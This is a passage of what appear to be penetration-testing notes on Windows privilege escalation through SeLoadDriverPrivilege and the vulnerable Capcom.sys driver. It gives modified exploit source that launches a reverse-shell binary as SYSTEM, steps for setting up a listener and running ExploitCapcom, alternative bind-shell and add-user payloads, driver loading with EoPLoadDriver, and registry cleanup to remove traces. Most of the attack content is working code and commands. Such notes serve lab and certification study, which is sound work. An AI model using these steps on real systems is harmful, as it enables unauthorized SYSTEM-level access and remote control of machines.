## Alternate Exploitation — No GUI

If there is no GUI access, modify `ExploitCapcom.cpp` to execute a custom payload instead of `cmd.exe`.

### 1. Change the payload

Original:

```cpp
TCHAR CommandLine[] = TEXT("C:\\Windows\\system32\\cmd.exe");
```

Change to:

```cpp
TCHAR CommandLine[] = TEXT("C:\\ProgramData\\revshell.exe");
```

Full function:

```cpp
// Launches a command shell process
static bool LaunchShell()
{
    TCHAR CommandLine[] = TEXT("C:\\ProgramData\\revshell.exe");
    PROCESS_INFORMATION ProcessInfo;
    STARTUPINFO StartupInfo = { sizeof(StartupInfo) };
    if (!CreateProcess(CommandLine, CommandLine, nullptr, nullptr, FALSE,
        CREATE_NEW_CONSOLE, nullptr, nullptr, &StartupInfo,
        &ProcessInfo))
    {
        return false;
    }

    CloseHandle(ProcessInfo.hThread);
    CloseHandle(ProcessInfo.hProcess);
    return true;
}
```

**Why:** `ExploitCapcom.exe` will execute the specified binary when exploitation succeeds.

    ```text
    C:\ProgramData\revshell.exe
    ```

- Set up a listener matching the payload.
    
- Execute:
    
    ```cmd
    ExploitCapcom.exe
    ```
    

**Alternative payloads:** If a reverse shell is blocked, consider a bind shell or exec/add-user payload.

## Automating with EoPLoadDriver

`EoPLoadDriver.exe` automates:

2. Creating the required registry key
    
3. Calling `NTLoadDriver` to load the driver

Then execute:

```cmd
ExploitCapcom.exe
```

**Why:** Loads `Capcom.sys` and then triggers the ExploitCapcom privilege-escalation technique, allowing execution of the configured payload as **SYSTEM**.

## Cleanup

Remove the registry key created for the driver:

```cmd
reg delete HKCU\System\CurrentControlSet\Capcom
```

Confirmation:

```text
Permanently delete the registry key HKEY_CURRENT_USER\System\CurrentControlSet\Capcom (Yes/No)? Yes

The operation completed successfully.
```

**Why:** Removes the registry configuration used to load the driver.

> **Important:** Since **Windows 10 version 1803**, `SeLoadDriverPrivilege` is no longer exploitable through registry keys under `HKEY_CURRENT_USER`, because references to `HKCU` registry keys can no longer be used for this technique.
